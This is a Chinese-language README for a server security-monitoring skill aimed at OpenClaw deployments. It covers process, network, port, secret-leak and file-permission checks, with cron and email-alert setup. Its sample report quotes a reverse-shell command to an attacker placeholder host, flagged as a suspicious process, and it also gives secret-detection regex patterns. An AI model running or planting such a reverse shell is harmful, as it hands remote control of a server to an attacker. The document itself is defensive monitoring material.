# 安全监控技能 (security-monitor)

这是一个用于监控Linux/Unix服务器安全的技能,特别适用于腾讯云服务器上部署的OpenClaw等服务的安全审计。

## 功能特性

- ✅ 进程监控 - 检测可疑进程和高资源消耗
- ✅ 网络连接分析 - 识别异常连接和可疑端口
- ✅ 端口扫描 - 审查开放端口和服务
- ✅ 敏感信息泄露检测 - 扫描密钥、密码等敏感信息
- ✅ 文件权限审计 - 检查系统关键文件的可写权限

## 快速开始

### 1. 完整安全扫描

在服务器上执行完整的安全扫描:

```bash
# 上传技能到服务器
scp -r .codebuddy/skills/security-monitor user@your-server:/tmp/

# SSH登录服务器
ssh user@your-server

# 进入技能目录
cd /tmp/security-monitor

# 执行扫描(建议用root权限)
sudo python3 scripts/monitor.py
```

### 2. 针对性检查

#### 仅检查OpenClaw相关进程
```python
python3 -c "
from scripts.monitor import SecurityMonitor
monitor = SecurityMonitor()
processes = monitor.get_all_processes()
openclaw_procs = [p for p in processes if 'openclaw' in p['command'].lower()]
print(f'找到 {len(openclaw_procs)} 个OpenClaw进程:')
for p in openclaw_procs:
    print(f\"  PID: {p['pid']}, CPU: {p['cpu']}%, MEM: {p['mem']}%, 命令: {p['command'][:100]}\")
"
```

#### 扫描OpenClaw配置目录的敏感信息
```python
python3 -c "
from scripts.monitor import SecurityMonitor
monitor = SecurityMonitor()
monitor.scan_secrets_in_files('/opt/openclaw', max_files=100)
monitor.scan_secrets_in_files('/etc/openclaw', max_files=50)
print(monitor.generate_report())
"
```

#### 检查网络连接
```python
python3 -c "
from scripts.monitor import SecurityMonitor
monitor = SecurityMonitor()
connections = monitor.get_network_connections()
monitor.check_suspicious_connections(connections)
monitor.check_open_ports()
print(monitor.generate_report())
"
```

## 使用场景

### 场景1: OpenClaw部署后安全检查

```bash
# 1. 检查OpenClaw进程
ps aux | grep -i openclaw

# 2. 检查OpenClaw监听的端口
ss -tlnp | grep -i openclaw

# 3. 运行完整扫描
sudo python3 scripts/monitor.py

# 4. 重点检查OpenClaw配置
python3 -c "
from scripts.monitor import SecurityMonitor
monitor = SecurityMonitor()
monitor.scan_secrets_in_files('/opt/openclaw', max_files=200)
monitor.scan_secrets_in_files('/etc/openclaw', max_files=100)
print(monitor.generate_report())
"
```

### 场景2: 发现可疑行为后快速诊断

```bash
# 1. 查看当前所有进程
ps auxf

# 2. 检查网络连接
ss -tunap

# 3. 查看最近的登录记录
last -n 20
lastb -n 20  # 失败登录

# 4. 检查SUID文件
find / -perm -4000 -type f 2>/dev/null

# 5. 运行监控脚本
sudo python3 scripts/monitor.py
```

### 场景3: 定期安全审计(设置Cron)

```bash
# 编辑crontab
crontab -e

# 每天凌晨3点执行扫描,结果保存到日志
0 3 * * * /usr/bin/python3 /path/to/monitor.py >> /var/log/security-monitor.log 2>&1

# 每周日执行完整扫描并发送邮件
0 3 * * 0 /usr/bin/python3 /path/to/monitor.py | mail -s "安全扫描报告" admin@example.com
```

## 输出示例

```
================================================================================
安全监控报告
时间: 2024-03-10 15:30:45
================================================================================

【高危问题】(共 2 项)
--------------------------------------------------------------------------------
1. [高危] 可疑进程: PID 12345 - 命令: bash -i >& /dev/tcp/attacker.com/4444 0>&1
2. [敏感信息泄露] API密钥 在 /opt/openclaw/config/app.conf

【警告信息】(共 3 项)
--------------------------------------------------------------------------------
1. 高CPU使用率进程: PID 9876 (85.2% CPU) - /usr/bin/python3 /opt/openclaw/app.py
2. 开放非标准端口: 8080 - 请确认是否为预期服务
3. 外部连接到非标准端口: 192.168.1.100:5432

================================================================================
```

## 安全建议

### 立即处理
- 反弹shell、反向隧道等高危进程
- 敏感信息泄露
- 未授权的SUID文件

### 需要关注
- 高资源消耗进程(可能被挖矿)
- 非标准端口的外部连接
- 异常的网络连接

### 定期检查
- 开放端口变更
- 新增的服务
- 配置文件权限

## 扩展功能

### 添加自定义检测规则

编辑 `scripts/monitor.py`,在 `secret_patterns` 中添加:

```python
secret_patterns['OpenClaw配置'] = [
    r'openclaw[_-]?token["\']?\s*:\s*["\'][a-zA-Z0-9]{30,}["\']?',
    r'claw[_-]?secret["\']?\s*:\s*["\']?\w{20,}["\']?',
]
```

### 集成告警

```python
# 在脚本末尾添加
if monitor.violations:
    import smtplib
    from email.message import EmailMessage

    msg = EmailMessage()
    msg['Subject'] = '🚨 安全警报'
    msg['From'] = 'security@server.com'
    msg['To'] = 'admin@example.com'
    msg.set_content(monitor.generate_report())

    # 发送邮件
    smtp = smtplib.SMTP('smtp.example.com', 587)
    smtp.send_message(msg)
    smtp.quit()
```

## 限制与说明

1. **权限要求** - 某些检测需要root权限
2. **误报可能** - 需要人工判断检测结果
3. **性能影响** - 扫描大量文件时可能影响服务器性能
4. **语言支持** - 主要为Linux/Unix系统,支持Python 3.6+

## 参考资料

- [完整安全检查清单](references/security-checklist.md)
- [常见端口参考](references/common-ports.md)
- [技能使用文档](SKILL.md)

## 故障排除

### 问题1: 找不到ss命令
```bash
# Ubuntu/Debian
apt install iproute2

# CentOS/RHEL
yum install iproute
```

### 问题2: 没有root权限
```bash
# 非root权限仍可运行,但部分功能受限
python3 scripts/monitor.py
```

### 问题3: Python版本过低
```bash
# 检查Python版本
python3 --version

# 安装Python 3.6+
apt install python3  # Debian/Ubuntu
yum install python3   # CentOS/RHEL
```

## 技能结构

```
security-monitor/
├── SKILL.md                      # 技能主文档
├── README.md                     # 使用说明(本文件)
├── scripts/
│   └── monitor.py                # 核心监控脚本
└── references/
    ├── common-ports.md            # 常见端口参考
    └── security-checklist.md     # 安全检查清单
```

## 贡献与反馈

如发现问题或有改进建议,请联系AI助手。
